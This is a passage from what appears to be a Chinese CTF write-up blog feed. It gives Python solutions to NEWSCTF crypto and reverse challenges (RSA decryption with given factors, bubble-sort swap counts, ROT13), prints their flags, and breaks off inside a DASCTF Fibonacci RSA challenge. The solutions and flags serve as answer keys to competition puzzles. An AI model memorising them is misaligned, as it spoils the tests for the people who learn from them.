class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/RSA256/encrypted.message2&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(fp.read(), pri_key).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/RSA256/encrypted.message3&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(fp.read(), pri_key).decode())</span><br></pre></td></tr></table></figure>

<h3 id="big-exponent"><a href="#big-exponent" class="headerlink" title="big exponent"></a>big exponent</h3><p>好耶，striving师傅出的题目</p>
<p>好……好不起来？</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="comment">#from py import flag</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    p,q=getPrime(<span class="number">1024</span>),getPrime(<span class="number">1024</span>)</span><br><span class="line">    n,lcm=p*q,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">    e1 = invert(getPrime(<span class="number">730</span>), lcm)</span><br><span class="line">    e2 = invert(getPrime(<span class="number">730</span>), lcm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (e1,e2,n),(p,q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_e1</span>(<span class="params">e1</span>):</span></span><br><span class="line">    ep=getPrime(<span class="number">2040</span>)</span><br><span class="line">    n=e1*ep</span><br><span class="line">    <span class="keyword">assert</span> e1&gt;ep</span><br><span class="line">    phi=(ep-<span class="number">1</span>)*(e1-<span class="number">1</span>)</span><br><span class="line">    d=nextprime(<span class="built_in">int</span>(iroot(n,<span class="number">4</span>)[<span class="number">0</span>])*<span class="built_in">int</span>(iroot(n,<span class="number">200</span>)[<span class="number">0</span>]))</span><br><span class="line">    e=invert(d,phi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (e,n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_e2</span>(<span class="params">e2</span>):</span></span><br><span class="line">    eq=getPrime(<span class="number">2040</span>)</span><br><span class="line">    <span class="keyword">assert</span> e2&lt;eq</span><br><span class="line">    n=e2*eq</span><br><span class="line">    phi=(eq-<span class="number">1</span>)*(e2-<span class="number">1</span>)</span><br><span class="line">    d=nextprime(<span class="built_in">int</span>(iroot(n,<span class="number">4</span>)[<span class="number">0</span>]/<span class="number">3</span>)-getrandbits(<span class="number">30</span>))</span><br><span class="line">    e=invert(d,phi)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (e,n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">flag,e,n</span>):</span></span><br><span class="line">    m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(m,e,n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_key</span>(<span class="params">file_name,e,n</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(file_name,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    E=<span class="number">65537</span></span><br><span class="line">    pubkey,prikey=gen_key()</span><br><span class="line">    e1,e2,n=pubkey</span><br><span class="line">    E1,N1=encrypt_e1(e1)</span><br><span class="line">    export_key(<span class="string">r&quot;pubkey1.pem&quot;</span>,E1,N1)</span><br><span class="line">    E2,N2=encrypt_e2(e2)</span><br><span class="line">    export_key(<span class="string">r&quot;pubkey2.pem&quot;</span>,E2,N2)</span><br><span class="line">    export_key(<span class="string">r&quot;pubkey3.pem&quot;</span>,E,n)</span><br><span class="line"></span><br><span class="line">    cipher=encrypt(flag,E,n)</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">r&quot;flaggg.enc&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    f.write(cipher)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h4 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h4><p>题目不长，思路比较清楚</p>
<img alt="20210601 NEWSCTF（萌新赛）-29cee5ae.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-29cee5ae.png" width="" height="" >

<p>e2那一步可以用boneh_durfee求出d来，但是后面思路断了，看着像d泄漏，但是e也太大了</p>
<p>然后结果n可以分解出来</p>
<p>好家伙，看来只是水题</p>
<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>上家伙</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">101762447604961968347497011921099322367324119881977823223715806843654916018223203152717441386396615480134613864942068489600487206751473112264495957512819776729786840027245275219664091321087832913341367749452671938119115622233015167030327196487127307195872792552039408988207189866115101567965404039921455793363</span></span><br><span class="line">q = <span class="number">146645055489569596158773422326511843870914610026045288623162173369449741025994927278359852181645222010216728295790096211969513458244344811852179454305768973973420398459241985170762812039623053792853389316411927678494740679905048052776274447299638217155556426312374908963757267001415016478005573936685580868907</span></span><br><span class="line"><span class="keyword">assert</span> n == p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(E, phi))</span><br><span class="line">pri_key = rsa.PrivateKey(n, E, d, p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&#123;influx&#125;/NEWSCTF/big_exponent/flaggg.enc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="built_in">print</span>(fp.read())</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;k\xa3\xe0.[\t\x95\x8b\x08)b\xc0\x11\xd7\xee\xc8\x96\xfca\xa3@ \xe2\xd3\xab%P\xcc\xa7\x00\x94&gt;\xd7\xfc3\x0b\xa1\x85\xba]H|u\xdd\x0e\&#x27;\x96\xc4\xe2s\xbc\xf4\xd2\x94\xd7\xc9\x19|\xcf\xf7\xfa\xe3\x81\x98\xcd\xaa\x19\r\xdd\xc4|\x9d\xa4\xc4\x18\xda\xfeq\xa4\xf23\xef\xbf6\xfb\xa2&lt;\x8a1\xd0\xc9\xac\x8f&gt;D\xafa\x94&quot;NOZ\xff\xf1\xd8\x93&gt;\xea8\xd92\x94]\x07\xa5\xb3vl&gt;\xa1e\xf2\xcbR\xddXs\xbfG\xb5\xe9o\xce\x85]\x1b\xd2\xa9n\x9b\xa3\xa2\xc7\xa4\x0b\xca\xf1\xe76sT\xe2\x1bM\x1e\xaf\x17)\xda\x9f\x9454\x0c\xba\x17\xecY\xb2RUH\rLL\x8eE(dLx\x0b/\xc2M\xb5\xd2\\&#123;E\xff\x0f\xec\x0fMcE\xa1Me\x0c\xae\xfa!,\xb8\x87\xec\x7f?\xd8\xcc\xbc\xbb\xab\x0e\x0bp\x91\xac\x8b\xeb\x11\n%P\xe6\xd5\xbfQ\xdbh\xdbBi\xff2\xdeq\xbdS\xb9\x07\xf1jE/8+\x1dY\x80\x1f\xcdp\xfd&#x27;</span></span><br><span class="line">c = bytes_to_long(c)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;welcome_to_2th_compettion_2021&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re-signin"><a href="#re-signin" class="headerlink" title="re_signin"></a>re_signin</h3><p>主要的问题是pyc文件没有反编译成功</p>
<img alt="20210601 NEWSCTF（萌新赛）-0d2d4d1c.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-0d2d4d1c.png" width="" height="" >

<p>然后尝试百度之后，这道题最后的解法是</p>
<p>查看内码，试图反编译pyc，结果看到内码发现，不对啊，就是那么短，应该是文件的问题了</p>
<img alt="20210601 NEWSCTF（萌新赛）-80bbc7bd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210601 NEWSCTF（萌新赛）-80bbc7bd.png" width="" height="" >

<p>好在第二天题目上了hint，直接求冒泡排序的次数，小手动一动，flag天上来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">a = [[<span class="number">73</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">20</span>, <span class="number">64</span>, <span class="number">68</span>, <span class="number">99</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">9</span>, <span class="number">91</span>, <span class="number">42</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">8</span>, <span class="number">77</span>, <span class="number">55</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">93</span>],[<span class="number">85</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">58</span>, <span class="number">35</span>, <span class="number">83</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">18</span>, <span class="number">52</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">51</span>, <span class="number">84</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">88</span>, <span class="number">87</span>],[<span class="number">97</span>, <span class="number">34</span>, <span class="number">31</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">4</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">63</span>, <span class="number">65</span>, <span class="number">88</span>, <span class="number">30</span>, <span class="number">72</span>, <span class="number">21</span>, <span class="number">36</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">79</span>],[<span class="number">31</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">67</span>, <span class="number">30</span>, <span class="number">47</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">11</span>, <span class="number">89</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">74</span>, <span class="number">88</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">50</span>, <span class="number">83</span>],[<span class="number">88</span>, <span class="number">5</span>, <span class="number">85</span>, <span class="number">82</span>, <span class="number">36</span>, <span class="number">74</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">40</span>, <span class="number">55</span>, <span class="number">95</span>, <span class="number">8</span>, <span class="number">84</span>, <span class="number">47</span>, <span class="number">96</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">77</span>, <span class="number">67</span>, <span class="number">26</span>, <span class="number">39</span>],[<span class="number">54</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">66</span>, <span class="number">91</span>, <span class="number">39</span>, <span class="number">38</span>, <span class="number">57</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">28</span>, <span class="number">49</span>, <span class="number">92</span>, <span class="number">29</span>, <span class="number">85</span>, <span class="number">88</span>, <span class="number">84</span>, <span class="number">90</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">52</span>],[<span class="number">80</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">91</span>, <span class="number">10</span>, <span class="number">52</span>, <span class="number">11</span>, <span class="number">99</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">60</span>, <span class="number">48</span>, <span class="number">36</span>, <span class="number">74</span>, <span class="number">55</span>, <span class="number">51</span>, <span class="number">86</span>, <span class="number">49</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">82</span>, <span class="number">16</span>],[<span class="number">35</span>, <span class="number">70</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">65</span>, <span class="number">84</span>, <span class="number">71</span>, <span class="number">26</span>, <span class="number">14</span>, <span class="number">38</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">86</span>, <span class="number">20</span>, <span class="number">54</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">66</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">77</span>],[<span class="number">71</span>, <span class="number">25</span>, <span class="number">43</span>, <span class="number">23</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">30</span>, <span class="number">32</span>, <span class="number">18</span>, <span class="number">47</span>, <span class="number">13</span>, <span class="number">76</span>, <span class="number">8</span>, <span class="number">83</span>, <span class="number">87</span>, <span class="number">57</span>, <span class="number">26</span>, <span class="number">16</span>, <span class="number">19</span>],[<span class="number">29</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">94</span>, <span class="number">32</span>, <span class="number">57</span>, <span class="number">1</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">92</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">40</span>, <span class="number">80</span>, <span class="number">98</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">33</span>],[<span class="number">67</span>, <span class="number">14</span>, <span class="number">93</span>, <span class="number">91</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">10</span>, <span class="number">82</span>, <span class="number">38</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">27</span>, <span class="number">17</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">66</span>, <span class="number">24</span>, <span class="number">99</span>, <span class="number">43</span>],[<span class="number">29</span>, <span class="number">56</span>, <span class="number">44</span>, <span class="number">54</span>, <span class="number">70</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">85</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">32</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">21</span>, <span class="number">50</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">48</span>, <span class="number">90</span>, <span class="number">84</span>],[<span class="number">23</span>, <span class="number">33</span>, <span class="number">90</span>, <span class="number">7</span>, <span class="number">42</span>, <span class="number">71</span>, <span class="number">25</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">47</span>, <span class="number">54</span>, <span class="number">18</span>, <span class="number">97</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">85</span>, <span class="number">69</span>, <span class="number">49</span>],[<span class="number">77</span>, <span class="number">67</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">35</span>, <span class="number">6</span>, <span class="number">56</span>, <span class="number">94</span>, <span class="number">81</span>, <span class="number">23</span>, <span class="number">78</span>, <span class="number">50</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">28</span>, <span class="number">69</span>, <span class="number">43</span>, <span class="number">91</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">99</span>, <span class="number">38</span>],[<span class="number">20</span>, <span class="number">47</span>, <span class="number">52</span>, <span class="number">27</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">9</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">2</span>, <span class="number">97</span>, <span class="number">44</span>, <span class="number">35</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">29</span>, <span class="number">58</span>, <span class="number">56</span>, <span class="number">74</span>, <span class="number">84</span>],[<span class="number">66</span>, <span class="number">11</span>, <span class="number">76</span>, <span class="number">91</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">75</span>, <span class="number">32</span>, <span class="number">71</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">88</span>, <span class="number">20</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">63</span>, <span class="number">47</span>, <span class="number">78</span>, <span class="number">60</span>, <span class="number">81</span>],[<span class="number">43</span>, <span class="number">13</span>, <span class="number">70</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">52</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">78</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">73</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">25</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">87</span>],[<span class="number">24</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">47</span>, <span class="number">16</span>, <span class="number">40</span>, <span class="number">94</span>, <span class="number">98</span>, <span class="number">88</span>, <span class="number">64</span>, <span class="number">41</span>, <span class="number">83</span>, <span class="number">44</span>, <span class="number">35</span>, <span class="number">45</span>, <span class="number">75</span>, <span class="number">17</span>, <span class="number">46</span>],[<span class="number">33</span>, <span class="number">12</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">96</span>, <span class="number">92</span>, <span class="number">50</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">56</span>, <span class="number">44</span>],[<span class="number">12</span>, <span class="number">36</span>, <span class="number">16</span>, <span class="number">44</span>, <span class="number">19</span>, <span class="number">62</span>, <span class="number">43</span>, <span class="number">80</span>, <span class="number">58</span>, <span class="number">98</span>, <span class="number">69</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">70</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">48</span>],[<span class="number">51</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">98</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">99</span>, <span class="number">84</span>, <span class="number">80</span>, <span class="number">93</span>, <span class="number">37</span>, <span class="number">56</span>, <span class="number">77</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">94</span>, <span class="number">52</span>, <span class="number">88</span>],[<span class="number">80</span>, <span class="number">38</span>, <span class="number">88</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">70</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">76</span>, <span class="number">18</span>, <span class="number">57</span>, <span class="number">73</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">77</span>, <span class="number">67</span>],[<span class="number">18</span>, <span class="number">53</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">94</span>, <span class="number">42</span>, <span class="number">61</span>, <span class="number">75</span>, <span class="number">62</span>, <span class="number">60</span>, <span class="number">73</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">48</span>, <span class="number">80</span>, <span class="number">23</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">71</span>],[<span class="number">16</span>, <span class="number">54</span>, <span class="number">87</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">22</span>, <span class="number">63</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">6</span>, <span class="number">84</span>, <span class="number">80</span>, <span class="number">4</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">42</span>, <span class="number">14</span>, <span class="number">43</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble</span>(<span class="params">n</span>):</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>, i, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> n[j] &lt; n[j-<span class="number">1</span>]:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                t = n[j]</span><br><span class="line">                n[j] = n[j-<span class="number">1</span>]</span><br><span class="line">                n[j-<span class="number">1</span>] = t</span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(bubble(l)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synt&#123;jrypbzr_gb_arjfpgs&#125;</span><br></pre></td></tr></table></figure>

<p>然后凯撒一下得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;welcome_to_newsctf&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>团队WP</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 DASCTFXBUUOJ五月大联动Crypto方向部分WP</title>
    <url>/posts/88b63128/</url>
    <content><![CDATA[<p>不是部分啦，就一道呜呜呜，但是草鸡详细哦</p>
<p>xs，我tm根本登不进去，报名时出了点问题</p>
<p>最后直接看别人发在群里的题目了</p>
<p>总共有三题，一道完全不懂，一道好像是椭圆曲线的RelatedMessage，反正就这道题有点思路，因为找到一篇关于斐波那契是RSA模数的论文，打算借此机会研究一下</p>
<span id="more"></span>

<h1 id="DASCTF-X-BUUOJ-五月大联动"><a href="#DASCTF-X-BUUOJ-五月大联动" class="headerlink" title="DASCTF X BUUOJ 五月大联动"></a>DASCTF X BUUOJ 五月大联动</h1><h2 id="Fibonacci"><a href="#Fibonacci" class="headerlink" title="Fibonacci"></a>Fibonacci</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;*************************&#125;&#x27;</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> F(n - <span class="number">1</span>) + F(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p=getPrime(<span class="number">8</span>)</span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    F=F(n)</span><br><span class="line">    c=<span class="built_in">pow</span>(m,<span class="number">65537</span>,F)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;n = %d&#x27;</span>%(n))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;F(n) = %d&#x27;</span>%(F))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;c = %d&#x27;</span>%(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 30039002188673063651200304724856649750424855614713561659816258454033925531379709006718595334296516241593158998074215212142272196270365664747873959581114872378007750905526355257967620809790424857457592189785708634246739647422565451143815984036502331156971328504879840492056807034649796388685443055568787638373563</span></span><br><span class="line"><span class="string">F(n) = 36700337315478358423302463804643502364132894595387679831392170242048570294154137205916046749632259595443511772051005890145681246611711817441148722686433058905309178967626876196428817911402628279151882749816176290631663850711266005570519120688501046610172118214633159846090742563888545000820131558915392759986137704413717356161549696109102298045171982651759736931461029700093546074544216714411268154766313965335118439291477901688458760307733751977411099481922798986947005456033024215394531788003343093192780270571980899284495530589488614458267489897774350955741276841747926401364869628844871476483816139224540693572750083532852690939679488779770278121521966166639184387859708670915429469804929002101080867694318638835470062005769336931710061708165085286293560882862673863182161513175108975599928164057840378446866053785509135134250439675861761412916432659950998041079347609299108756058982586701419597870024243472621875398244582253182771532237956030075796524234449649579003219049</span></span><br><span class="line"><span class="string">c = 5149579488901718498256373861975221458889060262051324713153792274531569740959338672159468511041469512968513162060650323314015111729630790249929764405001469068728832250672432536655958494683225528045534739312500520653653926107616626321646038503307002215682827882897681738805565989931916973526625237494508575698650414426281874530049741540818321302625573676530536769431267223818807952634410781018835593002628264062168865877875709419051886274533984009771861504132373726000546543208681246415153517353772565209140561174813777886487077708362479762600413004602240042298109893816953817393105259401510845057279294044756541864350957113952935658077279981571022227194710269040317178329523984989277421087981594122731035549685470894608888049815174440061043045638797036874542111575347820490125255592416295645107767029867230219384632544284156692872055786752135888144873738488840255388898851551453544530082551649823629868841430161794325580654855230486824210856918330348898081161664747016870749921</span></span><br><span class="line"><span class="string">n = 20756277616755836861796337131683494338352701206928094011019872107808330954223862907177555525893261715593610455375647872190101833907080699823790147515155417500649420182409578349022597139001229776650770207829659368291648098353474620323733162983388953788239424626462428488411835382477744747369092196172727799468129</span></span><br><span class="line"><span class="string">F(n) = 73745878045934636387896195274069826551569516766963182339313590908194755029865664679120132471843611642027469204171633501721641080925317635658799561477123939207311526297390646712571316606381873782191178958234889168599083479590822672109275622907151415552207811665808203751267410151224170154736841450903230193274146578562848780223022725054392389915985290416059522271191922854734627854849084277940339695243325424932830011581455271309868481867791848671985869262214017536640985196012788793460756899871516178490553441223897250090614367273308559864669269965578509523152119870676641602044879271520652270508502838994825168113044092631541016378753797168654004397854528716878554680966919397339024634461107466963998140873416841269245629405227723896214356538994142798927935847118081299628628813983021407779086407107873835131175157418129203731497042769363491200520978441329400751265966093987214492433690588592278950077342020700742819163199408329926294779182691364743193734488228719</span></span><br><span class="line"><span class="string">c = 5893676968379648852677257584942191109596695953257511502221493623707657958793151928063695511404323761502093871747314475680963368412056002167272056988434183588136518540030328900237814175026374170035752147457944130025788557913749495512316872731640598728203711834687604349623497761823630666336599012384701148134898626277451946739191645056229526840490101366707716010899628734677395956010814780086058428182227433879240458756480238286363782312887091585752283137070930652073681891561066188131229432708558323016170835880200185835314330898745048592325798107333894598294876001536344275083054913481975007098183772410065580414486344966276992142840553960291265334551415769700709112077959058690472699228393932778693676888105307493544864165340738016954896582284163878309410561472175085522432252484026380738098291004277354471010420592137620174716251226560188793137038378169674648650109100511358090004029326014324282641470675210622193652390362972072927753788251933923336522541020538</span></span><br><span class="line"><span class="string">n = 23691611795512881548876576490920777356012500842496810447368465555253207159934330531730113872431842020621324344446142448954349963332039143377219840904377051014940314330764948944111930704132580375788932310940376348012980840541573284360163056070088226098587825855247120630453584914813593602869923553994121677913829</span></span><br><span class="line"><span class="string">F(n) = 9354120234373821188002721174172376187851074553842250946994966454521076364770447254561289329644492544492363073660918209867635665556179493971516453831575577085229601305613934033279832212516762995062790158649731235328923025944567754094837437882988453755837757140503680845082446605924488438186342529892438539978025244619294478667640323307281530468578326413724432442367286795555698768396763148070646067431485983937912884160277380848384622618517411849896779104223556934427313741222400162647303864273804545658096365574243669367638797710979775090679277794669009497301787205587916669811596486681600927221914751277959719025890975947906807551671033707046998050580404291266129815613731776357171701993365320613177014644670728884401252046842886254766791009584832861321307145962353061550438485818190867215102212015602783104130507243211654301408379888922865198634687009616395466846020452426608653076648665616711357303753242673389482755201639605067581161306428053985480749</span></span><br><span class="line"><span 